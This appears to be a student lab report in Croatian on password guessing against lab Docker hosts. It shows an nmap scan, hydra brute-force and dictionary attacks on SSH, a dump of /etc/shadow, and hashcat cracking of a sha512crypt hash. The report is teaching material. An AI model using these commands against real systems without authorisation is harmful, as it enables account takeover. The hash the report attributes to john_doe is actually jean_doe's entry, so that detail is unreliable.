# Izvještaj iz SRP laboratorijskih vježbi [5]

# Online and Offline password guessing attacks

U ovoj smo vježbi napadali lokalni *Docker container* s našim korisničkim imenom i odgovarajućom lozinkom. Lozinku ne znamo, pa ju trebamo otkriti. Ovo smo radili na 2 načina; prvi je *online*, gdje aktivno šaljemo pokušaje prijave, direktno na korisničko ime s odgovarajućom IP adresom, a drugi *offline*, gdje se napada lokalno spremljeni hash lozinke korisnika.

## Online password guessing attack

Koristimo *nmap*, alat koji skenira mrežu i na njoj otkriva ***host*-ove i servise** tako što **šalje pakete** i **analizira odgovore** na njih.

Alat prvo instaliramo, a zatim pokrećemo na mreži 10.0.15.0, mrežne maske 28.

```bash
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ sudo apt-get update
[sudo] password for student:
Get:1 http://security.ubuntu.com/ubuntu bionic-security InRelease [88.7 kB]
Hit:2 http://archive.ubuntu.com/ubuntu bionic InRelease
Hit:3 http://archive.ubuntu.com/ubuntu bionic-updates InRelease
Hit:4 http://archive.ubuntu.com/ubuntu bionic-backports InRelease
Fetched 88.7 kB in 0s (218 kB/s)
Reading package lists... Done
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ sudo apt-get install nmap
......
```

```bash
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507/ab$ nmap -v 10.0.15.0/28

Starting Nmap 7.60 ( https://nmap.org ) at 2021-12-20 13:11 CET
Initiating Ping Scan at 13:11
Scanning 16 hosts [2 ports/host]
Completed Ping Scan at 13:11, 1.21s elapsed (16 total hosts)
Initiating Parallel DNS resolution of 16 hosts. at 13:11
Completed Parallel DNS resolution of 16 hosts. at 13:11, 14.01s elapsed
Nmap scan report for 10.0.15.13 [host down]
Nmap scan report for 10.0.15.14 [host down]
Nmap scan report for 10.0.15.15 [host down]
Initiating Connect Scan at 13:11
Scanning 13 hosts [1000 ports/host]
Discovered open port 22/tcp on 10.0.15.1
Discovered open port 22/tcp on 10.0.15.2
Discovered open port 22/tcp on 10.0.15.3
Discovered open port 22/tcp on 10.0.15.4
Discovered open port 22/tcp on 10.0.15.5
.......
```

Vidljivo je da je na mreži aktivno 13 *host*-ova, koji koriste TCP protokol.

Specifično napadamo ssh, odnosno *secure shell*, kriptografski mrežni protokol za operiranje mrežnim servisima na siguran način preko neosigurane mreže.

Pokušaj otvaranja *remote shell*-a:

```bash
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507/ab$ ssh bartulovic_antonia@10.0.15.6
The authenticity of host '10.0.15.6 (10.0.15.6)' can't be established.
ECDSA key fingerprint is SHA256:u4rEaCKzOum3w9z1y+9B+DW/uDhp020DQXH4Sso12ns.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.0.15.6' (ECDSA) to the list of known hosts.
bartulovic_antonia@10.0.15.6's password:
```

Nažalost, ne znamo šifru. Zato ćemo je pokušati saznati!

Napad izvršavamo koristeći ***hydra*** alat, koji, naravno, prvo treba instalirati:

```bash
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507/ab$ sudo apt-get install hydra-gtk
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following additional packages will be installed:
.......
```

Pošto znamo da se šifra sastoji isključivo od malih slova engleske abecede te da ima između 4 i 6 znakova, možemo procijeniti *password space* i okvirno zaključiti koliko bi vremena trebalo za otkriti šifru na ovaj način:

```bash
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507/ab$ hydra -l bartulovic_antonia -x 4:6:a 10.0.15.6 -V -t 1 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-20 13:15:36
[DATA] max 1 task per 1 server, overall 1 task, 321254128 login tries (l:1/p:321254128), ~321254128 tries per task
[DATA] attacking ssh://10.0.15.6:22/
[ATTEMPT] target 10.0.15.6 - login "bartulovic_antonia" - pass "aaaa" - 1 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.6 - login "bartulovic_antonia" - pass "aaab" - 2 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.6 - login "bartulovic_antonia" - pass "aaac" - 3 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.6 - login "bartulovic_antonia" - pass "aaad" - 4 of 321254128 [child 0] (0/0)
[ATTEMPT] target 10.0.15.6 - login "bartulovic_antonia" - pass "aaae" - 5 of 321254128 [child 0] (0/0)
......
```

Očito je da kombinacija ima stvarno puno, a zbog ograničenja servera ovakav bi napad trajao vrlo, vrlo dugo. Zato bi bilo idealno smanjiti broj šifri koje moramo probati.

Ovo radimo korištenjem ***pre-computed dictionary*-ja**. Prvo ga treba preuzeti s lokalnog servera:

```bash
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507/ab$ wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g1/
--2021-12-20 13:19:45--  http://a507-server.local:8080/dictionary/g1/
Resolving a507-server.local (a507-server.local)... 10.0.1.172, fe80::aaa1:59ff:fe69:5278
Connecting to a507-server.local (a507-server.local)|10.0.1.172|:8080... connected.
HTTP request sent, awaiting response... 200 OK
......
FINISHED --2021-12-20 13:19:46--
Total wall clock time: 0.1s
Downloaded: 3 files, 353K in 0.03s (11.7 MB/s)
```

Sada smo spremni za *online* napad, koristeći unaprijed napravljen riječnik lozinki. U ovom se riječniku nalazi 878 šifri, što je puno manje od početnog *password space*-a. Napad izvodimo ovako:

```bash
hydra -l bartlovic_antonia -P dictionary/g1/dictionary_online.txt 10.0.15.6 -V -t 4 ssh

Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-12-20 13:43:21
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 878 login tries (l:1/p:878), ~220 tries per task
[DATA] attacking ssh://10.0.15.6:22/
[ATTEMPT] target 10.0.15.6 - login "bartlovic_antonia" - pass "kajjeg" - 1 of 878 [child 0] (0/0)
[ATTEMPT] target 10.0.15.6 - login "bartlovic_antonia" - pass "kajttg" - 2 of 878 [child 1] (0/0)
[ATTEMPT] target 10.0.15.6 - login "bartlovic_antonia" - pass "kajtze" - 3 of 878 [child 2] (0/0)
[ATTEMPT] target 10.0.15.6 - login "bartlovic_antonia" - pass "kajnek" - 4 of 878 [child 3] (0/0)
[ATTEMPT] target 10.0.15.6 - login "bartlovic_antonia" - pass "kajlzj" - 5 of 878 [child 0] (0/0)
[ATTEMPT] target 10.0.15.6 - login "bartlovic_antonia" - pass "kajnpp" - 6 of 878 [child 1] (0/0)
.......

[22][ssh] host: 10.0.15.6   login: bartlovic_antonia   password: itharm
```

*Bingo!* Otkrili smo šifru za korisničko ime `bartlovic_antonia`.

Sada se možemo ulogirati koristeći korisničko ime i otkrivenu lozinku:

```bash
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507/ab$ ssh bartlovic_antonia@10.0.15.6
bartlovic_antonia@10.0.15.6's password:
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-91-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bartlovic_antonia@host_bartlovic_antonia:~$
```

## Offline password guessing attack

Ovaj napad izvodi se na malo drugačiji način. Pokušaji prijave ne šalju se direktno serveru, već se napadaju password hashevi spremljeni na našem uređaju.

Za ovaj dio koristit ćemo alat `hashcat`. Prvo smo instalirali `hashcat`, a zatim smo pronašli slijedeće hasheve:

```bash
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507/ab$ sudo apt-get install hashcat
[sudo] password for student:
Reading package lists... Done
Building dependency tree
Reading state information... Done
...
```

```bash
bartlovic_antonia@host_bartlovic_antonia:~$ sudo cat /etc/shadow
[sudo] password for bartlovic_antonia:
root:*:18900:0:99999:7:::
daemon:*:18900:0:99999:7:::
bin:*:18900:0:99999:7:::
sys:*:18900:0:99999:7:::
sync:*:18900:0:99999:7:::
games:*:18900:0:99999:7:::
man:*:18900:0:99999:7:::
lp:*:18900:0:99999:7:::
mail:*:18900:0:99999:7:::
news:*:18900:0:99999:7:::
uucp:*:18900:0:99999:7:::
proxy:*:18900:0:99999:7:::
www-data:*:18900:0:99999:7:::
backup:*:18900:0:99999:7:::
list:*:18900:0:99999:7:::
irc:*:18900:0:99999:7:::
gnats:*:18900:0:99999:7:::
nobody:*:18900:0:99999:7:::
_apt:*:18900:0:99999:7:::
systemd-network:*:18977:0:99999:7:::
systemd-resolve:*:18977:0:99999:7:::
messagebus:*:18977:0:99999:7:::
sshd:*:18977:0:99999:7:::
bartlovic_antonia:$6$Q3Z.6vcDgHRVOPWH$Zo5/95XXDXPfKLsc120ksglMTW85X0VehgTjJSb7JPEIjL2u3ud8//n1/A/QccrRVu3lijMBoAydGHoz5NJQ10:18981:0:99999:7:::
jean_doe:$6$W.ZyReSnHfDg9rN/$zqQYP/KLxhVTPRD9S.0we7GiJ0F/stCkdaELqDuF5aa86cLQ0oNnOVGBTKkmEn/0benNRsrPJIBYv1XNqu29./:18981:0:99999:7:::
john_doe:$6$NEebfpegsp57RC54$ienxOcRVI1dS07gl29WaTWRe/0PskXj0hQHegJIQph8VlmhdhfLvtHsk.4r.fFFNdRqfCTbFji1OlqaivMU1l/:18981:0:99999:7:::
alice_cooper:$6$NNPJy8qlR0v3RvTZ$Usnas0hEJQI7zgGPHQzrxlmcv/QOeIMWV1ssCj1qDDFWfsT8VFmVYW5sSRKssK4wOvB4BQWeZv01peq62KRDp0:18981:0:99999:7:::
john_deacon:$6$JwKqmlAmhraT4jsq$Kn2PQMZlX2zmeWuyunaaEMwm/gBUBQvRJJfwhGpoInPfIaL4wBBP0vvsomnA86yT7rTFZWmMoAlyq1tzWywx/1:18981:0:99999:7:::
freddie_mercury:$6$zwHt1q.pqY.KkBnP$Dviaz079JdeQnUM5YorxYOEDzIVha9CpwraEOoSoRfx93BKkYxMPIn6V0td4TaJsp7fwU3.T46BRxL5leQ3LO/:18981:0:99999:7:::
```

Odlučila sam napasti `john_doe` korisnika. Njegov je password hash ovaj:

```bash
$6$W.ZyReSnHfDg9rN/$zqQYP/KLxhVTPRD9S.0we7GiJ0F/stCkdaELqDuF5aa86cLQ0oNnOVGBTKkmEn/0benNRsrPJIBYv1XNqu29./
```

Hash spremimo u `hash.txt` datoteku u direktoriju. Zatim izvršavamo *offline* napad koristeći riječnik koji smo skinuli s lokalnog servera. Ovaj riječnik ima puno više lozinki od onog koji smo koristili za *online* napad, zato što ne ovisimo o brzini servera koji se napada, već samo o snazi našeg računala. 

Pokretanje napada:

```bash
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507/ab$ hashcat --force -m 1800 -a 0 hash.txt dictionary/g1/dictionary_offline.txt --status --status-timer 10
hashcat (v4.0.1) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz, 2048/7411 MB allocatable, 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

Password length minimum: 0
Password length maximum: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastical reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.
Watchdog: Temperature retain trigger disabled.

* Device #1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=4 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=16 -D KERN_TYPE=1800 -D _unroll'
* Device #1: Kernel amp_a0.bcd87d4b.kernel not found in cache! Building may take a while...
Dictionary cache built:
* Filename..: dictionary/g1/dictionary_offline.txt
* Passwords.: 50078
* Bytes.....: 350546
* Keyspace..: 50078
* Runtime...: 0 secs

- Device #1: autotuned kernel-accel to 44
- Device #1: autotuned kernel-loops to 46
$6$W.ZyReSnHfDg9rN/$zqQYP/KLxhVTPRD9S.0we7GiJ0F/stCkdaELqDuF5aa86cLQ0oNnOVGBTKkmEn/0benNRsrPJIBYv1XNqu29./:dscext=>

Session..........: hashcat
Status...........: Cracked
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$W.ZyReSnHfDg9rN/$zqQYP/KLxhVTPRD9S.0we7GiJ0F/stC...qu29./
Time.Started.....: Mon Dec 20 14:18:29 2021 (3 secs)
Time.Estimated...: Mon Dec 20 14:18:32 2021 (0 secs)
Guess.Base.......: File (dictionary/g1/dictionary_offline.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:      219 H/s (6.52ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 704/50078 (1.41%)
Rejected.........: 0/704 (0.00%)
Restore.Point....: 528/50078 (1.05%)
Candidates.#1....: kntpka -> kazaln
HWMon.Dev.#1.....: N/A

Started: Mon Dec 20 14:18:27 2021
Stopped: Mon Dec 20 14:18:33 2021
```

Imali smo sreće i pogodili smo šifru nakon samo 704 pokušaja, od mogućih 50078 u riječniku.

```bash
student@DESKTOP-7Q0BASR:/mnt/c/Users/A507/ab$ hashcat --force -m 1800 -a 0 hash.txt dictionary/g1/dictionary_offline.txt --status --status-timer 10 --show

$6$W.ZyReSnHfDg9rN/$zqQYP/KLxhVTPRD9S.0we7GiJ0F/stCkdaELqDuF5aa86cLQ0oNnOVGBTKkmEn/0benNRsrPJIBYv1XNqu29./:dscext
```

Šifra korisničkog profila `john_doe` je `dscext`.

Koristeći `ssh`, možemo testirati validnost *crack*-ane šifre za korisnički profil prijavom na udaljeni uređaj, kao što smo napravili i za `bartlovic_antonia`.